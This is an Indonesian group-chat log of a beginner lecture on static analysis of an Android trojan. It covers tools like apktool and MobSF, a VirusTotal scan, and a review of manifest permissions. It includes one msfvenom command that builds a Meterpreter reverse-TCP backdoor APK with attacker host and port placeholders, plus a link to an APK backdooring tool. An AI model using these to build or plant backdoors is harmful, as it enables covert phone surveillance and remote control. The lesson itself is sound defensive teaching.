@@ -1,0 +1,869 @@
+﻿Edo Maland, [01.05.17 19:54]
+Okedeh
+
+Edo Maland, [01.05.17 19:54]
+Mulai yaa om
+
+Edo Maland, [01.05.17 19:54]
+Salam Pembuka ~ 
+Untuk sharing disini , saya masih belajar ya om dan ini dari yang kuketahui berdasarkan sudut pandang saya , Jika ada yang salah mohon maafkan . Mari Berdiskusi :)
+
+Edo Maland, [01.05.17 19:55]
+😊
+
+Muhammad Ramdhan, [01.05.17 19:55]
+bismillah :)
+
+Edo Maland, [01.05.17 19:55]
+Nah malam ini kan kita tentang backdoor yang di reverse terus di analsis
+
+Edo Maland, [01.05.17 19:56]
+malware ( sample ) > reverse > analisis
+
+Edo Maland, [01.05.17 19:56]
+nah ada baiknya dulu aku jelasin konsep agar sampai ke topik utama ya om
+
+Edo Maland, [01.05.17 19:56]
+Kenapa Konsep kok ga langsung step stepnya aja ?
+
+Edo Maland, [01.05.17 19:57]
+iya biar kita itu dapat menyelsaikan problem yang leih dan lebih lagi karena kita udah tau jalan ceritanya kan enak . Sama halnya dengan hubungan kalau kita sudah saling mengerti dan mencintai pasti hubungan itu akan awet dan dapat bertahan lama . layaknya ilmu ini
+
+Edo Maland, [01.05.17 19:58]
+kalau step- step  lansgung gitu aja tanpa konsep , semua orang bisa kalau dikasih panduan gitu aja cuma ngikutin kok . Biasanya bakal terjebak dengan kreatif mereka karena mengikuti apa yang ada
+
+Aan, [01.05.17 19:59]
+Jadi, ruang lingkup yang akan dibahas dan nggak akan dibahasnya apa ya om? Biar jelas hehe
+
+Aan, [01.05.17 19:59]
+Jadi kalau ada pertanyaan dll yg ga berhubungan bisa di skip
+
+Edo Maland, [01.05.17 20:00]
+[In reply to Aan]
+Malware analysis om
+
+Edo Maland, [01.05.17 20:01]
+@blkct mainya jeda jeda aja per menit ya yug ikutin om tias , lebih bagus dan jaringan gw stabil untuk saat ini
+
+Hasna DzakiYYa, [01.05.17 20:02]
+30 mins, im waitin6$. Activate notification,, 😁
+
+Edo Maland, [01.05.17 20:07]
+Malware adalah perangkat yang berbahaya yg dibuat untuk merusak / menyusup /  tindakan tindakan yang tidak di diingikan / mengambil keuntungan 
+
+Malware ada class ( category) nya lagi yaitu
+
+- Trojan  ( topik saat ini yang akan di dalami dan di analsis )
+
+- Virus
+
+- Worm
+
+- Botnet
+
+- Ransomware
+
+Edo Maland, [01.05.17 20:08]
+nah kalau udah tau apa mwalre dll , berarti kalau malware analysis berarti kita menganalisa malware tersebut . nah malam ini kita akan menganalisa malware dengan class trojan
+
+Edo Maland, [01.05.17 20:13]
+Kalau mau mau mulai untuk melaukan analisa terhadap malware itu ya kita bisa buat semacam persiapan yang pertama kali ya pasti kita ngebuat lab virtual kita bisa menggunakan virtual machine dll
+
+Edo Maland, [01.05.17 20:13]
+yang kedua mengumpulkan beberapa tools untuk anaylsis .
+
+Edo Maland, [01.05.17 20:13]
+beberapa toolsnya bisa menggunakan
+
+Muhammad Ramdhan, [01.05.17 20:14]
+apa aja toolsnya om ?
+
+Edo Maland, [01.05.17 20:14]
+ini lagi diketik
+
+Edo Maland, [01.05.17 20:14]
+sbaar om wkwkw
+
+Edo Maland, [01.05.17 20:14]
+kecil kecil hurufnya disini
+
+Muhammad Ramdhan, [01.05.17 20:14]
+:v
+
+Edo Maland, [01.05.17 20:17]
+Untuk Reverse dan static anaylsis bisa menggunakan
+
+APKTool -  tool untuk reverse engineering 3rd party, mengekstrak dan membungkusnya kembali dan kita bisa melakukan beberapa modifikasi dari sin ( rebuilding i
+
+APKInspector ( GUI )  - untuk menganalisa juga om tapi ini lebih ke gui dia 
+
+Jadx  -  Dex to Java decompiler
+
+Edo Maland, [01.05.17 20:17]
+apalagi ya
+
+Edo Maland, [01.05.17 20:18]
+ooh untuk all in on
+
+Edo Maland, [01.05.17 20:18]
+aku taunya Mobsf
+
+Edo Maland, [01.05.17 20:18]
+https://github.com/MobSF/Mobile-Security-Framework-MobSF
+
+Edo Maland, [01.05.17 20:19]
+nah disaat ini kita hanya memakai tools apktools saja
+
+Edo Maland, [01.05.17 20:19]
+setelah beberapa tools terkumpulkan
+
+Edo Maland, [01.05.17 20:20]
+kita Mengumpulkan sample malware yang ada ( malam ini kita pakai sample malware ( trojan ) yang dibuat oleh msfvenom dengan jenis file apk
+
+Edo Maland, [01.05.17 20:22]
+kalau mau dibuat bisa tinggal perintah msfvenom -p andoird/meterprer/reverse_tcp LHOST=IP_addres LPORT=port  R > sample.apk
+
+Edo Maland, [01.05.17 20:23]
+tahap selanjutkan kita pindahkan sample malware ini ketmpt mesin kita ahahah
+
+Edo Maland, [01.05.17 20:23]
+oiya kita juga bisa menggunkn beberap tools GUI juga yaitu JD-GUI
+
+Edo Maland, [01.05.17 20:24]
+nah sebentr aku buat di laptop aku untuk samplenya
+
+Edo Maland, [01.05.17 20:27]
+[ Photo ]
+
+Edo Maland, [01.05.17 20:27]
+dan berhasil dibuat
+
+Edo Maland, [01.05.17 20:27]
+nah kita mulai deh menganalisanya
+
+Edo Maland, [01.05.17 20:27]
+dalam menganalisasnya sih ada fundamentalnya gitu
+
+Edo Maland, [01.05.17 20:27]
+dari buku partical malware anaylsis
+
+Edo Maland, [01.05.17 20:28]
+http://venom630.free.fr/pdf/Practical_Malware_Analysis.pdf
+
+Edo Maland, [01.05.17 20:28]
+nah fundamentalnya itu ada . Static malware anaylsis dan Dynamic malware anaylsis
+
+Edo Maland, [01.05.17 20:29]
+nah itu dibagi lagi static malware anaylsis 
+
+- Basic  static malware anaylsis 
+- Advanced static mlaware anaylsis
+
+Edo Maland, [01.05.17 20:30]
+Basic  static malware anaylsis  tahapan ini seorang malware anyalst melkukn pengecekan file yang di anggap berbahaya tanpa melakukan ekseksui ( tanpa dijalankan )
+
+Edo Maland, [01.05.17 20:30]
+contohnya paling sederhana upload ke virus total , terus di cek signaturenya
+
+Edo Maland, [01.05.17 20:30]
+#CMIIW
+
+Edo Maland, [01.05.17 20:30]
+Selanjutnya Advanced static mlaware anaylsis
+
+Edo Maland, [01.05.17 20:32]
+nah ditahap ini kita mulai melakukan reverse enginering  dan melakukan disambler . Disini seorang malware anaylst biasa sering bertinju / berhadapan dengan low level programing
+
+Edo Maland, [01.05.17 20:32]
+Dan fundamental kedua Dynamic malware anaylsis
+Dynamic malware anaylsis dibagi lagi juga ( Basic dan advanced juga )
+
+Edo Maland, [01.05.17 20:33]
+Basic Dynamic anaylsis ini si tukang analisa malware ini langsung execute programnya untuk dilakukan analisaa seperti dampak dan perubhan aapa aja yang terjadi ( file system , network )
+
+Edo Maland, [01.05.17 20:35]
+kalau Advanced Dynamic Anyalsis kita udah main ama debugger gaan , yaa tujuan untuk mengetahui proses apa aja yang jalan oleh si malware ini. disini seoran g malware analisis nya akan menggali informasinya lebih detail berdsarkan executablenya om
+
+Edo Maland, [01.05.17 20:36]
+nah dari semua penjelasan di atas kita akan melakukan Static Anyalsis sajaaa ( basic dan advanced )
+
+Edo Maland, [01.05.17 20:37]
+nih aku kasih sample malwareya coba upload disni
+
+Edo Maland, [01.05.17 20:38]
+wait kok kecil ya , aku cek bentar
+
+Edo Maland, [01.05.17 20:42]
+typo saat pembuatan om sehingga tidak utuh
+
+Edo Maland, [01.05.17 20:42]
+[ File : sample2.apk ]
+
+Edo Maland, [01.05.17 20:42]
+nah kan udah ada sample malware kita
+
+Riordan Pramana, [01.05.17 20:42]
+sama aja ukurannya @Malands
+
+Edo Maland, [01.05.17 20:42]
+kita lakukan basic static anylsis dengan upload ke virtus total
+
+Edo Maland, [01.05.17 20:43]
+kurang kopi saaya om
+
+Riordan Pramana, [01.05.17 20:43]
+hahaha,, lanjutt :)
+
+Edo Maland, [01.05.17 20:44]
+Aku udah mengupload ke virus total dan hasil scan 19/60
+
+Edo Maland, [01.05.17 20:44]
+[ Photo ]
+
+Edo Maland, [01.05.17 20:45]
+Disitu sudah nampak jelas dari resultnya bahwa disana adalah backdoor yang divuat dari metasploit
+
+Edo Maland, [01.05.17 20:45]
+Android.riskware.metasploit
+
+Edo Maland, [01.05.17 20:45]
+Metertpet sll
+
+Edo Maland, [01.05.17 20:47]
+selanjutnya advanced static malware anyslsis disni kita lakukan reverse enginering terhadap app itu menggunakan apktool
+
+Edo Maland, [01.05.17 20:47]
+agar lebih rinci
+
+blacknwhite, [01.05.17 20:47]
+[In reply to Edo Maland]
+Gw habis mandi ini wkwkwk oke do
+
+blacknwhite, [01.05.17 20:48]
+[In reply to Edo Maland]
+Ada tambahan dikit ya maaf menyela do (Inspeckage)
+
+Edo Maland, [01.05.17 20:49]
+nanti aja yang mobsf
+
+Edo Maland, [01.05.17 20:49]
+karena aku ga lebih rinci kesana
+
+Edo Maland, [01.05.17 20:49]
+ga rinci ke tools
+
+blacknwhite, [01.05.17 20:49]
+[In reply to Edo Maland]
+Ya, lanjut do.
+
+Edo Maland, [01.05.17 20:50]
+lakukan ekstrak terhadap filenya
+
+Edo Maland, [01.05.17 20:50]
+java -jar apktool.jar /home/robot/sample/sample2.apk
+
+Edo Maland, [01.05.17 20:50]
+disini kita mengesktraknya
+
+Edo Maland, [01.05.17 20:50]
+[ Photo ]
+
+Edo Maland, [01.05.17 20:51]
+wkwkwk ada yang kurang 
+
+java -jar apktool.jar d /home/robot/sample/sample2.apk
+
+Edo Maland, [01.05.17 20:52]
+setelah di ektras ntar ada foldernya to smali dll
+
+Edo Maland, [01.05.17 20:52]
+[ Photo ]
+
+Edo Maland, [01.05.17 20:53]
+nah kalo gw yaa  ,gw pertama kali langung cek androidmanifestnya
+
+Edo Maland, [01.05.17 20:54]
+cat AndroidManifest.xml
+
+Edo Maland, [01.05.17 20:54]
+bisa menggunakan teks editor lain tergantung kesukaan para sepuh sepuh disini
+
+Edo Maland, [01.05.17 20:54]
+android manifest.xml itu apa ?
+
+F C, [01.05.17 20:56]
+@Malands materi apa?
+
+F C, [01.05.17 20:56]
+Ketinggalan nih
+
+Riordan Pramana, [01.05.17 20:57]
+backdoor
+
+Edo Maland, [01.05.17 20:57]
+android manifest.xml adalah itu informasi penting di android setau gw untuk bisa di eks aplikasi tersebut
+
+Gunanya itu paling penting kalau di backdoor ini Memberikan Akses Permission, untuk di filter mau yang dipakai atau yang tidak , terus apalagi ya informasi host
+
+Edo Maland, [01.05.17 20:57]
+apalagi ya
+
+blacknwhite, [01.05.17 20:57]
+[In reply to F C]
+Nanti log saya kasih.
+
+Edo Maland, [01.05.17 20:58]
+nah disana kita bisa baca ada beberapa permission yang sangat tidak kita inginkan
+
+Edo Maland, [01.05.17 20:59]
+ntar gw foto
+
+Edo Maland, [01.05.17 20:59]
+[ Photo ]
+
+Edo Maland, [01.05.17 21:00]
+udah jelas banget itu ada akses ijin yang bisa di blacklist
+
+Edo Maland, [01.05.17 21:00]
+<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+
+Edo Maland, [01.05.17 21:01]
+seperti : READ PHONE ,CALL PHONE, SEND SMS , RECIVE,ACCES CAMERA , ACCES MICPHONE dll
+
+Edo Maland, [01.05.17 21:01]
+*suspect permssion
+
+Edo Maland, [01.05.17 21:02]
+nah kan kita udah tau itu udah jelas mlaware nakal gw pengen lacak nih siapa si yang buat dari mana ip nya
+
+Edo Maland, [01.05.17 21:02]
+nah itu berada di folder smali
+
+Edo Maland, [01.05.17 21:03]
+pembahsan smali *sudah dijelaskan sama om satria saat kulgram satu
+
+Edo Maland, [01.05.17 21:03]
+kita masuk ke folder smali itu
+
+Edo Maland, [01.05.17 21:03]
+masuk terus masuk terus
+
+Edo Maland, [01.05.17 21:03]
+sampai dalam
+
+Edo Maland, [01.05.17 21:03]
+jangan croot didalam tapi
+
+Muhammad Ramdhan, [01.05.17 21:03]
+nnjir
+
+Edo Maland, [01.05.17 21:03]
+saat sampai ujung kita akan menemukan folder stage
+
+Edo Maland, [01.05.17 21:03]
+gw langsung tertuju pada file Payload , berbau curiga niih gw
+
+Edo Maland, [01.05.17 21:03]
+terus gw bukan teks editor favorit gw
+
+Edo Maland, [01.05.17 21:04]
+nano
+
+Edo Maland, [01.05.17 21:05]
+wait gw cek lagi scroll scroll mana ni
+
+Edo Maland, [01.05.17 21:05]
+wkwk
+
+Aan, [01.05.17 21:08]
+Berarti masuknya Android Malware Analyst ya om Maland ?
+
+Edo Maland, [01.05.17 21:08]
+iya om itu sesuai judul mengalisa backdoor android yang dibuat dengan msfvenom
+
+Aan, [01.05.17 21:09]
+[In reply to Edo Maland]
+Saya kemaren baru coba2 mobsf aja sih kebetulan
+
+Aan, [01.05.17 21:09]
+Biar terbantu
+
+Aan, [01.05.17 21:09]
+Hehe
+
+Edo Maland, [01.05.17 21:09]
+aww ini msfvenom backdoor android udah keren aja , gw baca pakainano ga kebaca
+
+Edo Maland, [01.05.17 21:09]
+pakai mobsf bisa om silahkan gapapa
+
+Edo Maland, [01.05.17 21:10]
+gw biasanya pakai JD-GUI sih kalau udah kaya gini casenya
+
+blacknwhite, [01.05.17 21:10]
+mantep kang aan
+
+Aan, [01.05.17 21:10]
+Biasanya cuman buat belajar android kalau reverse android
+
+Edo Maland, [01.05.17 21:10]
+*ip attackernya ya
+
+blacknwhite, [01.05.17 21:10]
+[In reply to Aan]
+coba inspeckage
+
+Aan, [01.05.17 21:10]
+Maklum ga ngerti ngoding sama bikinnya 😅😅
+
+Aan, [01.05.17 21:10]
+Wis lanjut om
+
+blacknwhite, [01.05.17 21:10]
+lanjut
+
+Aan, [01.05.17 21:11]
+Sambil nulis juga saya, tp bukan bahasan IT 😅
+
+Edo Maland, [01.05.17 21:12]
+mobsf juga bagus sih om
+
+Edo Maland, [01.05.17 21:12]
+soalnya tinggal uplad langsung dapat resultnya , best
+
+blacknwhite, [01.05.17 21:14]
+inspeckage juga ko, tp lebih top mobsf sih kalau aku
+
+Noname404, [01.05.17 21:14]
+Lanjut..
+
+Edo Maland, [01.05.17 21:15]
+yug mobsf ada kan di elu
+
+Edo Maland, [01.05.17 21:15]
+analisas yang pakai mobsf , gw habis bersih bersih soalnya lagi gada , ini net lemot
+
+Edo Maland, [01.05.17 21:16]
+@blkct
+
+Edo Maland, [01.05.17 21:17]
+kemungkinan om @petruknisme mau bantuin upload ke mobsf
+
+Edo Maland, [01.05.17 21:19]
+ts
+
+Edo Maland, [01.05.17 21:19]
+tes
+
+Edo Maland, [01.05.17 21:19]
+a
+
+Aan, [01.05.17 21:21]
+Koneksi saya 3g om
+
+Edo Maland, [01.05.17 21:24]
+tes
+
+Edo Maland, [01.05.17 21:25]
+kalau masuk pesanya bls
+
+muhammad rizky rahmattullah, [01.05.17 21:26]
+masuk
+
+Edo Maland, [01.05.17 21:27]
+@blkct oi
+
+Edo Maland, [01.05.17 21:27]
+oi
+
+Edo Maland, [01.05.17 21:35]
+ga bisa upload gambar
+
+Edo Maland, [01.05.17 21:35]
+wkwkkw
+
+Edo Maland, [01.05.17 21:35]
+rusuh ini telkom
+
+muhammad rizky rahmattullah, [01.05.17 21:38]
+maap menyela .  mobsf itu sebuah tool ?
+
+Edo Maland, [01.05.17 21:39]
+iya om
+
+Edo Maland, [01.05.17 21:40]
+berhubung sinyal gw kaco dan tiak bisa mengupload hasil pciture aku mohon maaf
+
+Muhammad Ramdhan, [01.05.17 21:40]
+iya om gpp
+
+Edo Maland, [01.05.17 21:41]
+nah di mobsf itu semacam tools all in one , saat kita upload fsample malware kita nanti disana sudah ada hasil analsisanya
+
+Edo Maland, [01.05.17 21:41]
+mungkin om om yang lain mau sharing gambar mobfnya
+
+muhammad rizky rahmattullah, [01.05.17 21:43]
+penasaran nih sama gambar nya .. baru pertama kali tau 😂
+
+Edo Maland, [01.05.17 21:48]
+gw tutup aja ya
+
+Edo Maland, [01.05.17 21:48]
+sepi
+
+Muhammad Ramdhan, [01.05.17 21:49]
+mungkin bisa dilanjut kapan2 om bahasannya yak
+
+Edo Maland, [01.05.17 21:49]
+udah pada tidur ini om kayanya haha
+
+Arip Seprudin, [01.05.17 21:49]
+Saya belum om
+
+Riordan Pramana, [01.05.17 21:50]
+wkwkwk
+
+Ernes Triandika, [01.05.17 21:50]
+Belum
+
+Arip Seprudin, [01.05.17 21:50]
+Kan nyimak om, masa mau tanya jawab
+
+muhammad rizky rahmattullah, [01.05.17 21:50]
+belum
+
+Edo Maland, [01.05.17 21:50]
+udah om open sesi tanya jawab om
+
+Fadjar Kubs, [01.05.17 21:50]
+masih nyimak dulu hehe
+
+Edo Maland, [01.05.17 21:50]
+picturenya ga keupload ni
+
+muhammad rizky rahmattullah, [01.05.17 21:51]
+jadi setelah kita upload apa bisa tau ip attacker ?
+
+Arip Seprudin, [01.05.17 21:51]
+Protes om ke telkom, deface lagi web nya 😂
+
+blacknwhite, [01.05.17 21:52]
+[In reply to Edo Maland]
+Ya?
+
+blacknwhite, [01.05.17 21:52]
+MobSF knp do?
+
+Edo Maland, [01.05.17 21:52]
+@blkct yang mobsf tolong upload kan sample mwalre tadi terus pict asal analisa upload kesini
+
+Edo Maland, [01.05.17 21:52]
+gw retrymulu upload pict
+
+blacknwhite, [01.05.17 21:53]
+Bebas malwarenya?
+
+blacknwhite, [01.05.17 21:53]
+ok
+
+Muhammad Ramdhan, [01.05.17 21:53]
+ada referensi lain ga om, yg bisa aku bisa baca lebih jauh
+
+Edo Maland, [01.05.17 21:54]
+jangan malware yang tadi
+
+blacknwhite, [01.05.17 21:54]
+Referensi untuk apa?
+
+blacknwhite, [01.05.17 21:54]
+[In reply to Edo Maland]
+Iya
+
+Riordan Pramana, [01.05.17 21:54]
+[In reply to Muhammad Ramdhan]
+mastahku :'
+
+Edo Maland, [01.05.17 21:54]
+malware yang tadi maksud gw
+
+Edo Maland, [01.05.17 21:54]
+jangan , malware yang tadi aja
+
+Muhammad Ramdhan, [01.05.17 21:54]
+referensi tentang android malware analysis
+
+blacknwhite, [01.05.17 21:54]
+[In reply to Edo Maland]
+wkwkwk
+
+Muhammad Ramdhan, [01.05.17 21:54]
+[In reply to Riordan Pramana]
+aku nub om
+
+Edo Maland, [01.05.17 21:54]
+buru orag pada penasaran ama mobsf
+
+blacknwhite, [01.05.17 21:55]
+btr do gw baru buka wkwkwk
+
+Arip Seprudin, [01.05.17 21:55]
+Buruan om... Soalnya kebelet pipis nih 😁
+
+Riordan Pramana, [01.05.17 21:55]
+[In reply to Muhammad Ramdhan]
+jangan merendah :'v
+
+muhammad rizky rahmattullah, [01.05.17 21:55]
+😂👍
+
+Riordan Pramana, [01.05.17 21:55]
+[In reply to Edo Maland]
+mantep
+
+blacknwhite, [01.05.17 21:56]
+[ Photo ]
+
+blacknwhite, [01.05.17 21:56]
+itu adalah contoh mobsf
+
+blacknwhite, [01.05.17 21:56]
+[ Photo ]
+
+blacknwhite, [01.05.17 21:56]
+dari sample2.apk
+
+blacknwhite, [01.05.17 21:56]
+[ Photo ]
+
+Aan, [01.05.17 21:56]
+[In reply to Edo Maland]
+Boleh saya kasih unjuk mobsf, tapi di artikel yg pernah saya tulis?
+
+Edo Maland, [01.05.17 21:58]
+silahkan om
+
+Riordan Pramana, [01.05.17 21:58]
+lebih friendly MobSF ya :D
+
+Edo Maland, [01.05.17 21:58]
+@petruknisme  ini sharing om , gapapa kayanya aku udahan paling nanti aku upload poto tadi kesini
+
+Aan, [01.05.17 21:59]
+Sekilas waktu iseng 😅
+
+Aan, [01.05.17 21:59]
+[Forwarded from Aan]
+https://petruknisme.com/2017/04/07/android-static-analysis-dengan-mobsf/
+
+Muhammad Ramdhan, [01.05.17 21:59]
+[In reply to Aan]
+ntap
+
+Edo Maland, [01.05.17 22:00]
+naah om itu lebih detail untuk mobsf
+
+Riordan Pramana, [01.05.17 22:00]
+[In reply to Aan]
+ijin sedot wkwkwk
+
+Arip Seprudin, [01.05.17 22:00]
+[In reply to Aan]
+Bookmark dulu
+
+muhammad rizky rahmattullah, [01.05.17 22:00]
+[In reply to Aan]
+intip dulu
+
+Noname404, [01.05.17 22:01]
+Om Maland ntar bsa kirim log pembahasan ini ?
+
+Riordan Pramana, [01.05.17 22:02]
+ane juga kirimin log nya om @Malands
+
+Edo Maland, [01.05.17 22:03]
+@blkct nanti dikasih yuga om
+
+Noname404, [01.05.17 22:04]
+[ 😊 Sticker ]
+
+Riordan Pramana, [01.05.17 22:04]
+ok deh, @blkct ntr kirim log nya ya
+
+Noname404, [01.05.17 22:04]
+Thaks om
+Soalnya daerah papua sdh pagi
+
+Noname404, [01.05.17 22:04]
+Saatnya tutup selimut
+
+Edo Maland, [01.05.17 22:04]
+silahkan beratya om
+
+Noname404, [01.05.17 22:05]
+Pling bertnya nda smpe 100 kg 😁😁
+
+Edo Maland, [01.05.17 22:06]
+bertanya
+
+Edo Maland, [01.05.17 22:06]
+malam ini sampai sini saja kisah kita
+
+Riordan Pramana, [01.05.17 22:07]
+👍
+
+Hasna DzakiYYa, [01.05.17 22:07]
+[ 😢 Sticker ]
+
+Fadjar Kubs, [01.05.17 22:07]
+ingin bertanya om di gambar MobSF itu statusnya dangerous , apakah semua yang ada ber status begitu ,berbahaya semua  ?
+
+Noname404, [01.05.17 22:09]
+Ada yg pk indihome ?
+
+Edo Maland, [01.05.17 22:09]
+aku pak
+
+Aan, [01.05.17 22:09]
+[In reply to Fadjar Kubs]
+Tergantung kebutuhannya
+
+Fadjar Kubs, [01.05.17 22:09]
+aku pak
+
+Aan, [01.05.17 22:09]
+Pada beberapa kasus, hal tersebut terkategori berbahaya
+
+Noname404, [01.05.17 22:09]
+Soalnya kmrin sy test pk tunnel kok error ya ?
+
+Edo Maland, [01.05.17 22:09]
+Semua tergantung
+
+Aan, [01.05.17 22:09]
+Bila pada fase production
+
+blacknwhite, [01.05.17 22:09]
+Gw kirim lognya aga maleman ya
+
+Fadjar Kubs, [01.05.17 22:10]
+berarti tergantung dan sesuai kebutuhan ya om ?
+
+Aan, [01.05.17 22:10]
+Contohnya debugging mode
+
+Aan, [01.05.17 22:10]
+Pada production debugging mode tidak diperbolehkan aktif
+
+Edo Maland, [01.05.17 22:10]
+sama seperti kamu bilg makan ayam itu berbahaya ga ? tergantung kalau orang yang alergi terhadap ayam maka diakan mengangagap itu berbahay kalau orang ya suka ayam maka tidak akan menggap berbahaya
+
+Noname404, [01.05.17 22:10]
+Om blacknwhite  daerah papua uda malem
+
+Riordan Pramana, [01.05.17 22:10]
+[In reply to blacknwhite]
+okee
+
+Edo Maland, [01.05.17 22:10]
+@blkct belom yug ini lagi tanya jawab
+
+Aan, [01.05.17 22:11]
+Dan disesuaikan juga dengan kegunaan aplikasi
+
+Edo Maland, [01.05.17 22:11]
+[In reply to Aan]
+benerr
+
+Aan, [01.05.17 22:11]
+Analyst hanya melakukan assesment
+
+Fadjar Kubs, [01.05.17 22:11]
+ouhehe oke makasih om
+
+Edo Maland, [01.05.17 22:11]
+lanjut om aan
+
+Edo Maland, [01.05.17 22:11]
+😃
+
+Aan, [01.05.17 22:11]
+Sama seperti halnya kalau pakai scanner untuk mencari vuln dalam web
+
+Aan, [01.05.17 22:12]
+Terkadang ada false positive atau bahkan untuk beberapa kasus seperti clickjacking itu diabaikan
+
+Aan, [01.05.17 22:12]
+Mungkin gitu gan ✌️
+
+Edo Maland, [01.05.17 22:13]
+asik gaaan
+
+Fadjar Kubs, [01.05.17 22:13]
+mantappp
+
+Edo Maland, [01.05.17 22:13]
+[In reply to Aan]
+Belati dong om bahas bahas lagi
+
+Aan, [01.05.17 22:14]
+Masih dev gan. Kalau TheFatRat kan masih nyambung sama bahasan tadi gan 👍
+
+Edo Maland, [01.05.17 22:16]
+waduh om masih ga ada apa apanya om
+
+Edo Maland, [01.05.17 22:17]
+wah sepi yaa om
+
+muhammad rizky rahmattullah, [01.05.17 22:17]
+apAkah mobsf hanya untuk linux .. jika saya pakai windows bagaimanA ?
+
+Aan, [01.05.17 22:17]
+Eh iya. Anu. Kalau mau coba bisa juga pakai ini https://github.com/dana-at-cp/backdoor-apk
+
+Aan, [01.05.17 22:18]
+[In reply to muhammad rizky rahmattullah]
+Gak. Selama ada python pasti bisa jalan. Dan library nya disesuaikan
+
+muhammad rizky rahmattullah, [01.05.17 22:20]
+[In reply to Aan]
+jadi hArus instal python dulu .. oke makasih ..
+
+Edo Maland, [01.05.17 22:20]
+om nanya dong
+
+Aan, [01.05.17 22:21]
+[In reply to muhammad rizky rahmattullah]
+Iya gan
+
+Edo Maland, [01.05.17 22:22]
+[In reply to muhammad rizky rahmattullah]
+Main Game AION aja buat refreshin iya ga om @petruknisme
+
+Aan, [01.05.17 22:22]
+AION?
+
+muhammad rizky rahmattullah, [01.05.17 22:22]
+apa itu aion ?
+
+Edo Maland, [01.05.17 22:23]
+lah ? bukanya dev ?
+
+muhammad rizky rahmattullah, [01.05.17 22:24]
+game kAyak dota ya 😂 ..
+
+Aan, [01.05.17 22:25]
+Dev apa ya? 😅
+
+Edo Maland, [01.05.17 22:33]
+Malam ini kita tutup yaa , Saya masih banyak kekurangan dan masih belajar . Tapi tidak ada salahnya membagi ilmu dengan jari jari jemantik ku
+
+Hasna DzakiYYa, [01.05.17 22:34]
+[ ✨ Sticker ]
+
+Edo Maland, [01.05.17 22:34]
+sampai jumpa di kulgram berikutnya
+
+
